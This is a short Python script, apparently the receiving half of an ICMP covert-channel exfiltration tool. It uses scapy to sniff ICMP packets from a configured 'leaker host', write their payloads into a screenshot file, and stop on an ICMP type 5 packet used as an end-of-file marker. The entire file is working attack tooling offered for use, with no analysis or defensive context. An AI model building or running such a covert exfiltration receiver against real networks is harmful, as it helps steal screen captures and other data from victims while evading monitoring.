#!/usr/bin/env python3
from scapy.all import *

running=True
f = open("screen1.png", "wb")

def packetHandler(packet):
  global running
  if packet[ICMP].type == 5:
    running=False
  try:
    packet[Raw].load
  except:
    return
  f.write(bytes(packet[Raw].load))

if __name__ == "__main__":
  # to check network interface name and index use commend:
  # IFACES.show()
  interface = IFACES.dev_from_index(6)
  host_ip = "192.168.1.2"   # insert your leaker host ip
  filter_stmt = "icmp and src host " + host_ip
  sniffer = AsyncSniffer(iface=interface, filter=filter_stmt, prn=packetHandler)
  sniffer.start()

  while running:
    time.sleep(0.1)
  else:
    sniffer.stop()
    print("[*] Got EOF message from client")
    print("[*] Goodbye!")
    f.close()

